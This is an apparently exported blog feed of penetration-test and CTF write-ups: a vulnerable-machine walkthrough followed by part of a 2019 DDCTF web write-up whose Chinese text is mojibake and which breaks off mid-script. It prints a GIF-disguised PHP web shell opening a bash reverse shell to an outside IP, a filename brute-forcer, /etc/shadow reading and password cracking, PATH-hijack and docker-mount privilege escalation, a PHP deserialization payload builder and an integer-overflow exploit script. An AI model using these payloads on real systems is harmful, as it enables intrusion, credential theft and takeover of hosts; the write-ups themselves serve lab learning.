<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;b&gt;Select image : &lt;/b&gt; </span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> style=<span class="string">"border: solid;"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">	$rand_number = rand(<span class="number">1</span>,<span class="number">100</span>);</span><br><span class="line">	$target_dir = <span class="string">"uploads/"</span>;</span><br><span class="line">	$target_file = $target_dir . md5(basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$rand_number));</span><br><span class="line">	$file_name = $target_dir . basename($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">	$uploadOk = <span class="number">1</span>;</span><br><span class="line">	$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">	$type = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">	$check = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">	<span class="keyword">if</span>($check[<span class="string">"mime"</span>] == <span class="string">"image/png"</span> || $check[<span class="string">"mime"</span>] == <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">		$uploadOk = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$uploadOk = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">":)"</span>;</span><br><span class="line">	&#125; </span><br><span class="line">  <span class="keyword">if</span>($uploadOk == <span class="number">1</span>)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file.<span class="string">"."</span>.$imageFileType);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File uploaded /uploads/?"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>as you can see, this waf only check out the <code>mime</code> , which can be passed with <code>GIF89a</code> as a header of any file. And the second question is : how to visit our <code>php</code> file uploaded?. The answer is <code>brute force</code> as there is only 100 possibilities of stored filename.</p>
<p>shell.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.108/9998 0&gt;&amp;1'"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>-i </code>means <code>interactive</code> ,and <code>&gt;&amp;</code> is another expression of <code>1&gt;filename 2&gt;&amp;1</code> or <code>2&gt;filname 1&gt;&amp;2</code>, which is equal to <code>&amp;&gt;</code>.<br>
<code>0&gt;&amp;1</code>means redirecting the stdin to stdout, in this case , <code>stdin</code> ,<code>stdout</code> and <code>stderr</code> have all been redirect to us, thus we got a shell.</p>
<p>see the link below:</p>
<p><a href="https://superuser.com/questions/436586/why-redirect-output-to-21-and-12" target="_blank" rel="noopener">https://superuser.com/questions/436586/why-redirect-output-to-21-and-12</a></p>
<p><a href="https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01</a></p>
<p><a href="https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean" target="_blank" rel="noopener">https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean</a></p>
<p>and another script to visit the <code>shell.php</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">filename = <span class="string">'shell.php'</span></span><br><span class="line">url = <span class="string">'http://172.28.18.114:8000/uploads/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    target = url + hashlib.md5(filename + str(i)).hexdigest() + <span class="string">'.php'</span></span><br><span class="line">    <span class="keyword">print</span> target</span><br><span class="line">    res = requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Not'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">print</span> target</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'not found'</span></span><br></pre></td></tr></table></figure>
<p>Meanwhile open our <code>nc -lvvkp 9998</code> on our server, and wait for the shellâ€¦</p>
<p>But <code>www-data</code> is a low-right user. So, ckeck out enabled-execution by using <code>find / -perm -4000 2&gt;/dev/null</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57026887-70ba3f80-6c6d-11e9-8d0d-490bbd3fc84e.png" alt="Screenshot from 2019-05-01 23-02-01"></p>
<p>and read <code>/etc/shadow</code> using <code>tail</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57026962-9fd0b100-6c6d-11e9-983b-a7e2727773ae.png" alt="Screenshot from 2019-05-01 23-03-05"></p>
<p>copy the line start with <code>root</code> into a file and use <code>john {filename} --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027064-f5a55900-6c6d-11e9-951a-5b427989dac1.png" alt="Screenshot from 2019-05-01 23-05-07"></p>
<p>try<code>su</code> but failed with error message <code>su: must be run from a terminal</code>.<br>
So~,we can use python to convert it to a terminal by using command as follows:</p>
<p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
<p>then <code>su</code> could be used. Now check the <code>/root/flag</code>, which echos â€¦<code>Life consists of details</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027318-a9a6e400-6c6e-11e9-8cc8-cbf9548e7e4f.png" alt="Screenshot from 2019-05-01 23-09-32"></p>
<p>Remember we got to know the website was built based on <code>wordpress</code>? Check the <code>/var/www/html/wp-config.php</code> and we got this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(&apos;DB_USER&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&apos;DB_PASSWORD&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define(&apos;DB_HOST&apos;, &apos;db:3306&apos;);</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line">define(&apos;DB_CHARSET&apos;, &apos;utf8&apos;);</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don&apos;t change this if in doubt. */</span><br><span class="line">define(&apos;DB_COLLATE&apos;, &apos;&apos;);</span><br></pre></td></tr></table></figure>
<p>as the website server and database was seperated ,we should visit database as if it was a remote host:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -h db -uwordpress -pwordpress</span><br><span class="line"></span><br><span class="line">show databases;</span><br><span class="line">use wordpress;</span><br><span class="line">show tables;</span><br><span class="line">select * from host_ssh_cred;</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/57027323-aca1d480-6c6e-11e9-99d7-f2e8d00f0dc2.png" alt="Screenshot from 2019-05-01 23-20-59"></p>
<p>md5:<code>e10adc3949ba59abbe56e057f20f883e</code>,letâ€™s crack it.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027486-14581f80-6c6f-11e9-901c-7a631e5110d7.png" alt="Screenshot from 2019-05-01 23-23-19"></p>
<p><code>ssh hummingbirdscyber@172.28.18.114</code> and type our password:123456 to login.</p>
<h3 id="solution-1">solution 1</h3>
<p>try <code>find / -perm -u=s 2&gt;/dev/null</code> to find</p>
<blockquote>
<p>find the permission with SUID has been set, SUID will give the ownerâ€™s permission to the user who execute this file.</p>
</blockquote>
<p><img src="https://user-images.githubusercontent.com/40637063/57027536-3a7dbf80-6c6f-11e9-9ece-33412b2a9c57.png" alt="Screenshot from 2019-05-01 23-32-23"></p>
<p>and try to execute the <code>a.out</code>,we got <code>root</code> as output.</p>
<p>when trying to got to know the contant of the file, <code>cat</code> will display messy code ,while <code>strings</code> can display normally.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027553-47021800-6c6f-11e9-8f34-08b8ca573de9.png" alt="Screenshot from 2019-05-01 23-32-33"></p>
<p>Noticed?,there is <code>whoami</code> ,which leads to the output <code>root</code>, so when we execute the <code>a.out</code>, our permission has become <code>root</code> <a href="http://temporarily.As" target="_blank" rel="noopener">temporarily.As</a> <code>whoami</code> is a system function which system PATH will involved in when it was executed. <code>function hijacked</code> could be implement.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/whoami</span><br><span class="line">chmod 777 /tmp/whoami</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure>
<blockquote>
<p>why create our <code>whoami</code> in <code>/tmp</code>? because every users has full right under this director.</p>
</blockquote>
<p>so , <code>root</code> open a bash, and we can visit <code>/root</code> on it.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027755-d6a7c680-6c6f-11e9-810e-5f6adb04337c.png" alt="Screenshot from 2019-05-02 00-18-27"></p>
<h3 id="solution-2">solution 2</h3>
<p><code>id</code> shows that we can use command <code>docker</code>, and we are <code>root</code> in the docker container. So, why not mapping our target folder to files in docker?just like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images # and we found there is a ubuntu image</span><br><span class="line">docker run -it /:/root ubuntu</span><br></pre></td></tr></table></figure>
<p>By visiting <code>/root/root/flag</code>, we got flag.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027508-20dc7800-6c6f-11e9-9e1b-8839efc59354.png" alt="Screenshot from 2019-05-01 23-29-41"></p>
]]></content>
      <categories>
        <category>é¶æœºæ¸—é€</category>
      </categories>
  </entry>
  <entry>
    <title>2019 DDCTF web </title>
    <url>/2019/05/11/2019-DDCTF-web/</url>
    <content><![CDATA[<h1>didictf web wp</h1>
<p>è€ƒè¯•å‘¨ç»“æŸï¼Œæœ‰æ—¶é—´æ¥å¤ç°äº†ã€‚ã€‚ã€‚ç„¶é¹…å¥½åƒæœ‰é¢˜ç›®å´©äº†ï¼Œjavaåˆæ²¡å­¦è¿‡ã€‚ã€‚ã€‚åªèƒ½å¤ç°ä¸€éƒ¨åˆ†äº†ã€‚</p>
<h2 id="web-ç­¾åˆ°é¢˜">web ç­¾åˆ°é¢˜</h2>
<p>ç‚¹å‡»ï¼Œæ‰«æï¼Œå‘ç°é™¤äº†index.php ä¹‹å¤–å…¶ä»–éƒ½éœ€è¦ç™»é™†ï¼ŒæŠ“åŒ…å‘ç°æœ‰å‘é€<code>Auth.php</code>è¯·æ±‚ï¼Œå…¶ä¸­æœ‰<code>didictf_username</code>å­—æ®µï¼Œå°è¯•æ·»åŠ æˆä¸º<code>didictf_username: admin</code>ã€‚æˆåŠŸç™»é™†ã€‚</p>
<p>ç„¶ååœ¨è¿”å›åŒ…ä¸­æ˜¾ç¤ºå‡ºäº†ä¸€ä¸ª<code>phpæ–‡ä»¶</code>ï¼Œå°è¯•è®¿é—®çœ‹åˆ°äº†<code>Session.php</code>çš„æºä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'æŠ±æ­‰ï¼Œæ‚¨æ²¡æœ‰ç™»é™†æƒé™ï¼Œè¯·è·å–æƒé™åè®¿é—®-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);<span class="comment">//å»æ‰ç©ºæ ¼</span></span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);<span class="comment">//è¿‡æ»¤ç¬¬ä¸€</span></span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);<span class="comment">//è¿‡æ»¤ç¬¬äºŒ</span></span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);<span class="comment">// ....//config/flag.php</span></span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;<span class="comment">//../config/flag.php</span></span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//keyå»ºè®®ä¸º8ä½å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;<span class="comment">//target1: ç»•è¿‡æ‰€æœ‰false</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//cookie not empty</span></span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ddctf_id ä¸èƒ½ä¸ºç©º</span></span><br><span class="line"></span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);<span class="comment">//é•¿åº¦è¦å¤§äº32? 32ä½ä¹‹åçš„å†…å®¹</span></span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);<span class="comment">//ä¸€ç›´æˆªæ–­åˆ°å€’æ•°ç¬¬32ä½</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;<span class="comment">//key.txt å†…å®¹å’Œ ddctf_id å†…å®¹ç‰‡æ®µæ‹¼æ¥ å†md5 ç­‰äºddctf_id32ä½ä¹‹åçš„å†…å®¹</span></span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);<span class="comment">//ddctf_id ååºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ddctf_id ååºåˆ—åŒ–ä¹‹åçš„å†…å®¹è¦æœ‰ session_id ip_address user_agent å†æ¥ä¸ªpath??</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;<span class="comment">//sprintæ ¼å¼åŒ–æ‰“å°å‡½æ•°åˆ©ç”¨ï¼Œé€šè¿‡ä¼ é€’è¿›å‚æ•°nickname = %S è®©å®ƒå¯ä»¥è¯»å–keyã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ip_address è¦å†™è‡ªå·±çš„ip</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//user_agent å†…å®¹è¦å’Œ http_user_agentçš„åŒ¹é…</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="comment">//çœ‹èµ·æ¥å¯ä»¥åŠ¨æ‰‹è„šçš„åªæœ‰session_id?</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($</span><br><span class="line">    );</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°<code>key</code>ä¹‹åæ„é€ ddctfid:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//nickname = %s</span></span><br><span class="line"></span><br><span class="line">$a = <span class="string">'a:4:&#123;s:10:"session_id";s:32:"3f65fc339c032f85048e42f21fab4ef0";s:10:"ip_address";s:14:"211.137.22.191";s:10:"user_agent";s:78:"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0";s:9:"user_data";s:0:"";&#125;'</span>;</span><br><span class="line"></span><br><span class="line">$b = unserialize($a);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $path = <span class="string">'....//config/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = <span class="string">'EzblrbNS'</span>;</span><br><span class="line">$b[<span class="string">'user_data'</span>] = <span class="keyword">new</span> Application;</span><br><span class="line"></span><br><span class="line">$d = serialize($b);</span><br><span class="line"><span class="keyword">echo</span> urlencode($d.md5($key.$d));</span><br></pre></td></tr></table></figure>
<p>ä¼ å‚å³å¯ã€‚</p>
<h2 id="å¤§å‰å¤§åˆ©ä»Šæ™šåƒé¸¡">å¤§å‰å¤§åˆ©ä»Šæ™šåƒé¸¡</h2>
<p>é‡åˆ°ä¹°ä¸œè¥¿çš„é¢˜ç›®é¦–å…ˆæ€è·¯å°±æ˜¯æ”¹å˜ä»·æ ¼ï¼Œé€šè¿‡æŠ“åŒ…å‘ç°ä»·æ ¼å¯ä»¥å¾€å¤§æ”¹è€Œä¸èƒ½å¾€å°æ”¹ã€‚å¯ä»¥åˆ©ç”¨æ•´æ•°æº¢å‡º<code>0xffffffff+1</code>ï¼Œä¼ å‚è¿›å»å°±ä¹°åˆ°äº†ã€‚<br>
ç„¶åè¦æ·˜æ±°100ä¸ªäººï¼Œå®é™…ä¸Šè¦æ·˜æ±°149ä¸ªäººã€‚è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://117.51.147.155:5050'</span></span><br><span class="line">seq = [</span><br><span class="line">    <span class="string">'register'</span>,</span><br><span class="line">    <span class="string">'login'</span>,</span><br><span class="line">    <span class="string">'balance'</span>,</span><br><span class="line">    <span class="string">'search_ticket'</span>,</span><br><span class="line">    <span class="string">'bill'</span>,</span><br><span class="line">    <span class="string">'buy'</span>,</span><br><span class="line">    <span class="string">'bill'</span>,</span><br><span class="line">     <span class="string">'pay'</span>]</span><br><span class="line"></span><br><span class="line">url_seg = &#123;</span><br><span class="line">    <span class="string">'register'</span>:<span class="string">'/ctf/api/register?name=&#123;0&#125;&amp;password=11111111'</span>,</span><br><span class="line">    <span class="string">'login'</span>:<span class="string">'/ctf/api/login?name=&#123;0&#125;&amp;password=11111111'</span>,</span><br><span class="line">    <span class="string">'balance'</span>:<span class="string">'/ctf/api/get_user_balance'</span>,</span><br><span class="line">    <span class="string">'search_ticket'</span>:<span class="string">'/ctf/api/search_ticket'</span>,</span><br><span class="line">    <span class="string">'bill'</span>:<span class="string">'/ctf/api/search_bill_info'</span>,</span><br><span class="line">    <span class="string">'buy'</span>:<span class="string">'/ctf/api/buy_ticket?ticket_price=4294967296'</span>,</span><br><span class="line">    <span class="string">'remove'</span>:<span class="string">'/ctf/api/remove_robot?id=&#123;0&#125;&amp;ticket=&#123;1&#125;'</span>,</span><br><span class="line">    <span class="string">'pay'</span>:<span class="string">'/ctf/api/pay_ticket?bill_id=&#123;0&#125;'</span>&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">victiom =&#123;</span><br><span class="line"> <span 